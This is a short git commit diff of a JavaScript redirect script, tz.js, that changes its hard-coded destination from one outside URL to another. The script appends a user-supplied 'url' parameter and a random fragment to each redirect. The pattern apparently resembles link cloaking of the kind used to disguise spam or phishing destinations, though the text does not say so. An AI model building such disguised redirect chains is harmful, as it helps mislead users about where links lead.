72a08dde76175b66f58e13d58cf5b294aff6a5f6
mpicqq <303090101@qq.com>
2024-07-04 00:06:46 +0800

    Update tz.js

--- tz.js
+++ tz.js
@@ -9,7 +9,7 @@ const customParam = urlParams.get('url');
 const randomString = Math.random().toString(36).substring(2); // 生成随机字符串，包括数字和小写字母
 
 // 构建跳转链接
-let redirectURL = "https://pbwci.qun.hk/Ft0yMZYHXsxqFYE-qCt-vTf2C1O-";
+let redirectURL = "https://static.ylxweb.com/upload/xinyue/2024/tFormBoundaryJ.html";
 if (customParam) {
     redirectURL += "?url=" + customParam + "#" + randomString; // 将随机字符串添加到参数后面
 }
